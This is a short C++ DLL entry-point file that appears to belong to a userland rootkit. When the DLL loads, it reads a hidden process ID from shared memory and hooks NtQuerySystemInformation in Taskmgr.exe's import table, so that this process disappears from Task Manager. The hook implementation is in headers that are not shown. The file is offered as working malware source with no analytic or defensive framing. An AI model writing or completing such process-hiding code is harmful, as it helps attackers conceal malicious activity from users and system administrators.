// dllmain.cpp : Defines the entry point for the DLL application.
#include "stdafx.h"
#include "Process.hpp" 
#include "IATHooking.hpp"
#include "File.hpp"

constexpr char* TASK_MGR_EXE = "Taskmgr.exe";
constexpr char* HIDDEN_PID_NAME = "hidden_pid";
constexpr char* HOOK_FUNCTION = "NtQuerySystemInformation";

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	{
		IATHooking::g_hidden_pid = Process::read_global_memory(HIDDEN_PID_NAME);

		if (IATHooking::g_hidden_pid)
		{
			IATHooking::g_NtQuerySystemInformation_hook = new IATHooking::IATHooking(TASK_MGR_EXE, HOOK_FUNCTION, &IATHooking::HookedNtQuerySystemInformation);
		}

		break;
	}
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
	{
		if (IATHooking::g_NtQuerySystemInformation_hook)
		{
			delete IATHooking::g_NtQuerySystemInformation_hook;
		}
		break;
	}
	}

	return TRUE;
}